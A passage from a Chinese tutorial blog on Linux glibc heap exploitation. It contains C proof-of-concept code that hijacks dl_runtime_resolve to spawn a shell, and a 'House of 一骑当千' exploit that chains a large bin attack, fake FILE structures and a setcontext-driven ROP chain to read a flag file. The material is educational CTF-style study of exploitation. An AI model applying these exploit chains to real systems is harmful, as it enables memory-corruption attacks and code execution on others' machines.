class="line"></span><br><span class="line">    <span class="comment">// 当前ptr到原有libc基地址的偏移</span></span><br><span class="line">    <span class="type">size_t</span> base_off = <span class="number">0x7dff0</span>;</span><br><span class="line">    <span class="comment">// 以下地址均是相对于libc基地址的偏移</span></span><br><span class="line">    <span class="type">size_t</span> system_off = <span class="number">0x48a20</span>;</span><br><span class="line">    <span class="type">size_t</span> bitmask_word_off = <span class="number">0x4070</span>;</span><br><span class="line">    <span class="type">size_t</span> bucket_off = <span class="number">0x4198</span>;</span><br><span class="line">    <span class="type">size_t</span> exit_sym_st_value_off = <span class="number">0x81d8</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="type">size_t</span> hasharr_off = <span class="number">0x5264</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step5: set essential data for dl_runtime_resolve&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + bitmask_word_off) = <span class="number">0xf000028c0200130e</span>ul;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set bitmask_word to 0xf000028c0200130eul&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *) ((<span class="type">char</span> *) ptr + base_off + bucket_off) = <span class="number">0x86</span>u;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set bucket to 0x86u&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + exit_sym_st_value_off) = system_off;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set exit@sym.st_value to system_off 0x52290&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + exit_sym_st_value_off - <span class="number">8</span>) = <span class="number">0xf00120000174c</span>ul;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set other exit@sym members&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + hasharr_off) = <span class="number">0x7c967e3f</span>ul;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set hasharr to 0x7c967e3ful&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step6: get shell ---&gt; exit(\&quot;/bin/sh\&quot;)&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>((<span class="type">size_t</span>) strptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-一骑当千"><a href="#House-of-一骑当千" class="headerlink" title="House of 一骑当千"></a>House of 一骑当千</h1><p>通常我们利用 <code>setcontext + 53</code> 通过 rdi 指向的内存给寄存器赋值，但是从 glibc-2-29 开始，setcontext 通过 rdx 指向的内存给寄存器赋值。</p>
<p>通常情况可以采用 gadget 对 rdx 赋值然后跳转到 setcontext gadget 继续执行，但使用 gadget 需要我们能控制 rdi 寄存器指向的内存的前几个字节，并且未来的 glibc 的 setcontext 也可能不再使用 rdx 寄存器。</p>
<p>因此我们需要一个通用的方法比如直接调用 setcontext 函数对寄存器赋值，而这中直接调用 setcontext 的方法就是 House of 一骑当千。</p>
<p>setcontext 函数原型为 <code>int setcontext(const ucontext_t *ucp)</code> ，其中 <code>ucontext_t</code> 结构体定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* 64-bit FXSAVE format.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(cwd);</span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(swd);</span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(ftw);</span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(fop);</span><br><span class="line">  <span class="type">__uint64_t</span>		__ctx(rip);</span><br><span class="line">  <span class="type">__uint64_t</span>		__ctx(rdp);</span><br><span class="line">  <span class="type">__uint32_t</span>		__ctx(mxcsr);</span><br><span class="line">  <span class="type">__uint32_t</span>		__ctx(mxcr_mask);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpxreg</span>	_<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">libc_xmmreg</span>	_<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>		__glibc_reserved1[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> __ctx(uc_flags);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="type">stack_t</span> uc_stack;</span><br><span class="line">    <span class="type">mcontext_t</span> uc_mcontext;</span><br><span class="line">    <span class="type">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">    __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> __ssp[<span class="number">4</span>];</span><br><span class="line">  &#125; <span class="type">ucontext_t</span>;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0996462c16406336efd64497fff69725.png"
                      alt="在这里插入图片描述" style="zoom:15%;" 
                >
在`setcontext`函数中，除了对`mcontext_t uc_mcontext;` `sigset_t uc_sigmask;` `struct _libc_fpstate __fpregs_mem __ssp`这4个进行操作外，并没有对其他部分操作，也就是我们可以不关心其他的值。

<ul>
<li><p><code>uc_mcontext</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Context to describe whole processor state.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">gregset_t</span> __ctx(gregs);</span><br><span class="line">    <span class="comment">/* Note that fpregs is a pointer.  */</span></span><br><span class="line">    <span class="type">fpregset_t</span> __ctx(fpregs);</span><br><span class="line">    __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">mcontext_t</span>;</span><br></pre></td></tr></table></figure></div>

<p>这个就是存储寄存器的结构体，也是我们平时<code>setcontext+53</code>所使用的地方。有关数据设置和传统利用<code>setcontext+53</code>时一样即可。</p>
<p><strong>注意 <code>fpregs</code> 指针需要指向一块可读写内存。</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Restore the floating-point context.  Not the registers, only the</span><br><span class="line">       rest.  */</span><br><span class="line">    movq    oFPREGS(%rdx), %rcx</span><br><span class="line">    fldenv    (%rcx)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>uc_sigmask</code></p>
<p>这个主要是负责信号量，<strong>经测试全是0就可以，当然也可以使用其他程序拷贝过来的信号量。</strong></p>
</li>
<li><p><code>__ssp</code></p>
<p>这个所对应的步骤为<code>setcontext</code>中的如下内容，作用使加载 MXCSR 寄存器，经测试0也行，偏移为<code>0x1c0</code></p>
</li>
</ul>
<p>通过上述的设置就可以直接调用 <code>setcontext</code> 设置寄存器。例如 house of 魑魅魍魉 + house of 一骑当千 <a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_yjdq" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// leak libc_base</span></span><br><span class="line">  <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">  <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x77040</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">  <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2660</span>;</span><br><span class="line">  <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x620</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x610</span>);</span><br><span class="line">  <span class="built_in">free</span>(large);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x700</span>);</span><br><span class="line">  <span class="built_in">free</span>(unsorted);</span><br><span class="line">  large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *fake_helper_file = large - <span class="number">2</span>;</span><br><span class="line">  <span class="type">size_t</span> *fake_wide_data = fake_helper_file + <span class="number">28</span>;</span><br><span class="line">  <span class="type">size_t</span> *fake_put_stream = fake_helper_file + <span class="number">6</span>;</span><br><span class="line">  <span class="type">size_t</span> *write_base = fake_helper_file + <span class="number">60</span>;</span><br><span class="line">  <span class="type">size_t</span> *fake_ucontext = fake_helper_file + <span class="number">62</span>;</span><br><span class="line">  <span class="type">size_t</span> *rop = fake_ucontext + <span class="number">190</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> memcpy_got_addr = libc_base + <span class="number">0x1d1040</span>;</span><br><span class="line">  <span class="type">size_t</span> IO_helper_jumps_addr = libc_base + <span class="number">0x1cdb20</span>;</span><br><span class="line">  <span class="type">size_t</span> IO_str_jumps_addr = libc_base + <span class="number">0x1ce720</span>;</span><br><span class="line"></span><br><span class="line">  fake_helper_file[<span class="number">4</span>] = <span class="number">0</span>;                        <span class="comment">// _IO_write_base</span></span><br><span class="line">  fake_helper_file[<span class="number">5</span>] = <span class="number">1</span>;                        <span class="comment">// _IO_write_ptr</span></span><br><span class="line">  fake_helper_file[<span class="number">17</span>] = (<span class="type">size_t</span>)large + <span class="number">0x1500</span>;  <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">  fake_helper_file[<span class="number">20</span>] = (<span class="type">size_t</span>)fake_wide_data;  <span class="comment">// _wide_data</span></span><br><span class="line">  fake_helper_file[<span class="number">27</span>] = IO_helper_jumps_addr;    <span class="comment">// vtable -&gt; _IO_helper_jumps</span></span><br><span class="line">  fake_helper_file[<span class="number">57</span>] = (<span class="type">size_t</span>)fake_put_stream; <span class="comment">// _put_stream</span></span><br><span class="line"></span><br><span class="line">  fake_wide_data[<span class="number">3</span>] = (<span class="type">size_t</span>)write_base; <span class="comment">// _IO_write_base -&gt; write_base</span></span><br><span class="line">  fake_wide_data[<span class="number">4</span>] =</span><br><span class="line">      (<span class="type">size_t</span>)write_base + <span class="number">0x80</span> * <span class="number">4</span>; <span class="comment">// _IO_write_base -&gt; write_base +</span></span><br><span class="line"></span><br><span class="line">  fake_put_stream[<span class="number">0</span>] = <span class="number">0x400</span>; <span class="comment">// _flags</span></span><br><span class="line">  fake_put_stream[<span class="number">1</span>] =</span><br><span class="line">      (<span class="type">size_t</span>)&amp;write_base[<span class="number">2</span>] - <span class="number">1</span>;               <span class="comment">// _IO_read_ptr -&gt; &amp;ucontext - 1</span></span><br><span class="line">  fake_put_stream[<span class="number">4</span>] = memcpy_got_addr - <span class="number">0x20</span>;  <span class="comment">// _IO_write_base</span></span><br><span class="line">  fake_put_stream[<span class="number">5</span>] = memcpy_got_addr;         <span class="comment">// _IO_write_ptr</span></span><br><span class="line">  fake_put_stream[<span class="number">6</span>] = memcpy_got_addr + <span class="number">0x28</span>;  <span class="comment">// _IO_write_end</span></span><br><span class="line">  fake_put_stream[<span class="number">7</span>] = <span class="number">0</span>;                       <span class="comment">// _IO_buf_base</span></span><br><span class="line">  fake_put_stream[<span class="number">8</span>] = (<span class="type">size_t</span>)<span class="number">-1</span>;              <span class="comment">// _IO_buf_end</span></span><br><span class="line">  fake_put_stream[<span class="number">17</span>] = (<span class="type">size_t</span>)large + <span class="number">0x1500</span>; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">  fake_put_stream[<span class="number">27</span>] = IO_str_jumps_addr;      <span class="comment">// vtable -&gt; _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line">  write_base[<span class="number">0</span>] = (<span class="type">size_t</span>)setcontext;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;write_base[<span class="number">1</span>], <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(fake_ucontext, <span class="number">0</span>, <span class="number">968</span>);</span><br><span class="line">  <span class="type">size_t</span> pop_rdi_ret = libc_base + <span class="number">0x2aa82</span>;</span><br><span class="line">  <span class="type">size_t</span> pop_rsi_ret = libc_base + <span class="number">0x34bfa</span>;</span><br><span class="line">  <span class="type">size_t</span> pop_rax_ret = libc_base + <span class="number">0x41f13</span>;</span><br><span class="line">  <span class="type">size_t</span> syscall_ret = libc_base + <span class="number">0x85596</span>;</span><br><span class="line">  <span class="type">size_t</span> ret = pop_rax_ret + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  fake_ucontext[<span class="number">13</span>] = (<span class="type">size_t</span>)&amp;write_base[<span class="number">1</span>]; <span class="comment">// rdi -&gt; &quot;./flag&quot;</span></span><br><span class="line">  fake_ucontext[<span class="number">14</span>] = <span class="number">0</span>;                      <span class="comment">// rsi = 0</span></span><br><span class="line">  fake_ucontext[<span class="number">17</span>] = <span class="number">0x100</span>;                  <span class="comment">// edx = 0x100</span></span><br><span class="line">  fake_ucontext[<span class="number">20</span>] = (<span class="type">size_t</span>)rop;            <span class="comment">// rsp -&gt; rop</span></span><br><span class="line">  fake_ucontext[<span class="number">21</span>] = ret;                    <span class="comment">// rip -&gt; ret</span></span><br><span class="line">  fake_ucontext[<span class="number">28</span>] = (<span class="type">size_t</span>)large + <span class="number">0x1500</span>; <span class="comment">// fpregs -&gt; rw memory</span></span><br><span class="line"></span><br><span class="line">  rop[<span class="number">0</span>] = pop_rax_ret;</span><br><span class="line">  rop[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">  rop[<span class="number">2</span>] = syscall_ret;</span><br><span class="line">  rop[<span class="number">3</span>] = pop_rax_ret;</span><br><span class="line">  rop[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  rop[<span class="number">5</span>] = pop_rdi_ret;</span><br><span class="line">  rop[<span class="number">6</span>] = <span class="number">3</span>;</span><br><span class="line">  rop[<span class="number">7</span>] = pop_rsi_ret;</span><br><span class="line">  rop[<span class="number">8</span>] = (<span class="type">size_t</span>)write_base;</span><br><span class="line">  rop[<span class="number">9</span>] = syscall_ret;</span><br><span class="line">  rop[<span class="number">10</span>] = pop_rax_ret;</span><br><span class="line">  rop[<span class="number">11</span>] = <span class="number">1</span>;</span><br><span class="line">  rop[<span class="number">12</span>] = pop_rdi_ret;</span><br><span class="line">  rop[<span class="number">13</span>] = <span class="number">1</span>;</span><br><span class="line">  rop[<span class="number">14</span>] = pop_rsi_ret;</span><br><span class="line">  rop[<span class="number">15</span>] = (<span class="type">size_t</span>)write_base;</span><br><span class="line">  rop[<span class="number">16</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// FSOP</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> linux 堆利用</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2024-11-08 03:15:01</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-11-20 03:32:08
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2024/11/08/linux-heap-exploit/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/linux-user-pwn/">#linux user pwn</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/11/08/linux-heap-exploit-basic-knowlege/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">linux 堆利用基础知识</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/11/08/linux-format-string-exploit/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">linux 格式化字符串利用</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">linux 堆利用</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Unlink"><span class="nav-text">Unlink</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fastbin-Attack"><span class="nav-text">Fastbin Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastbin-Double-Free"><span class="nav-text">Fastbin Double Free</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Spirit"><span class="nav-text">House Of Spirit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Alloc-to-Stack-Arbitrary-Alloc"><span class="nav-text">Alloc to Stack &amp; Arbitrary Alloc</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unsorted-Bin-Attack"><span class="nav-text">Unsorted Bin Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Unsorted-Bin-Leak"><span class="nav-text">Unsorted Bin Leak</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unsorted-Bin-Attack-1"><span class="nav-text">Unsorted Bin Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Large-Bin-Attack-House-of-Fun"><span class="nav-text">Large Bin Attack (House of Fun)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A9%E6%9C%9F%E7%9A%84-Large-Bin-Attack"><span class="nav-text">早期的 Large Bin Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84-Large-Bin-Attack"><span class="nav-text">新版本的 Large Bin Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tcache-attack"><span class="nav-text">Tcache attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-tcache"><span class="nav-text">绕过 tcache</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-poisoning"><span class="nav-text">tcache poisoning</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Autm"><span class="nav-text">House of Autm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-dup"><span class="nav-text">tcache dup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-perthread-corruption"><span class="nav-text">tcache perthread corruption</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-IO"><span class="nav-text">House of IO</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-house-of-spirit"><span class="nav-text">tcache house of spirit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-extend"><span class="nav-text">tcache extend</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-key"><span class="nav-text">tcache key</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="nav-text">泄露堆地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache-key-bypass"><span class="nav-text">tcache key bypass</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-reverse-into-tcache"><span class="nav-text">fastbin_reverse_into_tcache</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-stash-unlink"><span class="nav-text">tcache stash unlink</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Heap-Overlapping"><span class="nav-text">Heap Overlapping</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#UAF-%E8%BD%AC-Heap-Overlapping"><span class="nav-text">UAF 转 Heap Overlapping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Off-by-Null-%E8%BD%AC-Heap-Overlapping"><span class="nav-text">Off by Null 转 Heap Overlapping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E7%89%88%E6%9C%AC-Off-by-Null-%E4%B8%8D%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80%E6%9E%84%E9%80%A0-Heap-Overlapping"><span class="nav-text">新版本 Off by Null 不泄露堆地址构造 Heap Overlapping</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952"><span class="nav-text">方法2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#malloc-init-state-attack"><span class="nav-text">malloc_init_state attack</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%84%E7%A7%8D-HOOK"><span class="nav-text">各种 HOOK</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#malloc-hook-realloc-hook"><span class="nav-text">malloc hook + realloc hook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#free-hook"><span class="nav-text">free hook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exit-hook"><span class="nav-text">exit hook</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mmap-%E8%8E%B7%E5%8F%96-libc-%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="nav-text">mmap 获取 libc 基地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#setcontext-gadget"><span class="nav-text">setcontext gadget</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#orw-shellcode"><span class="nav-text">orw shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8E-ROP-%E7%BB%93%E5%90%88"><span class="nav-text">与 ROP 结合</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%A8%E6%A0%88%E4%B8%8A%E6%9E%84%E9%80%A0-ROP"><span class="nav-text">在栈上构造 ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E8%87%B3%E5%A0%86"><span class="nav-text">栈迁移至堆</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-Roman"><span class="nav-text">House of Roman</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#House-Of-Einherjar"><span class="nav-text">House 